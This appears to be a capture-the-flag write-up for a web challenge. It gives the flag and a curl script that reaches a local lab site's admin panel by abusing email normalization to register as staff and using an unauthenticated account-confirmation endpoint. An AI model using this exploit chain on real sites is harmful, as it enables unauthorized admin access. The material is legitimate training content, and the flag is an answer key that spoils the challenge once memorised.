- Challenge Name: best cybersec resources
- Challenge Category: Web
- Challenge Difficulty: Medium
- Challenge Flag: `d4rk{B3_bett3r_0r_m4yb3_l3t_th3_B1g_t3ch_h4ndl3_1T}c0de`
- Challenge Description: d4rkc0de has the collection of best resources for cybersec. You can go find them here.
- Challenge Files: [files](deliverables/)
- Challenge Author: [d4r5h](https://github.com/DarshBhilwara)
- Challenge Solution: You can become staff by registering with an email like john.doe@d4rkc0de.in. (dot collapses to johndoe), then trivially activating the account via /confirm?user=attacker without needing the mailbox.
 Exploit
```
# 1) Grab the register page and extract the CSRF token into $CSRF
curl -s -c cookiejar http://localhost:8000/register -o /tmp/regpage.html
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' /tmp/regpage.html)
echo "csrf=$CSRF"

# 2) Register a staff-like email (note trailing dot is allowed too)
curl -s -b cookiejar -c cookiejar -X POST http://localhost:8000/register \
 -d "csrf=${CSRF}" \
 -d "username=attacker" \
 -d "password=Pass123!" \
 -d "email=john.doe@d4rkc0de.in." \
 -L -o /tmp/reg_response.html

# 3) Activate the account using the buggy confirm endpoint
curl -s -b cookiejar "http://localhost:8000/confirm?user=attacker" -L -o /tmp/confirm.html

# 4) Get login page CSRF, then login
curl -s -b cookiejar http://localhost:8000/login -o /tmp/login.html
LOGIN_CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' /tmp/login.html)
curl -s -b cookiejar -c cookiejar -X POST http://localhost:8000/login \
 -d "csrf=${LOGIN_CSRF}" \
 -d "username=attacker" \
 -d "password=Pass123!" -L -o /tmp/login_response.html

# 5) Visit /admin to confirm access and extract CSRF for rotate endpoint (if present)
curl -s -b cookiejar http://localhost:8000/admin -o /tmp/admin.html
# extract CSRF for rotate (if admin page embeds it in a form)
ROT_CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' /tmp/admin.html || true)

# 6) POST to rotate endpoint (if admin page had CSRF token)
if [ -n "$ROT_CSRF" ]; then
 curl -s -b cookiejar -X POST http://localhost:8000/admin/rotate-ci-token \
 -d "csrf=${ROT_CSRF}" -L
else
 # If admin page does not include CSRF hidden token, try posting an empty form (server will check session CSRF)
 curl -s -b cookiejar -X POST http://localhost:8000/admin/rotate-ci-token -L
fi
```
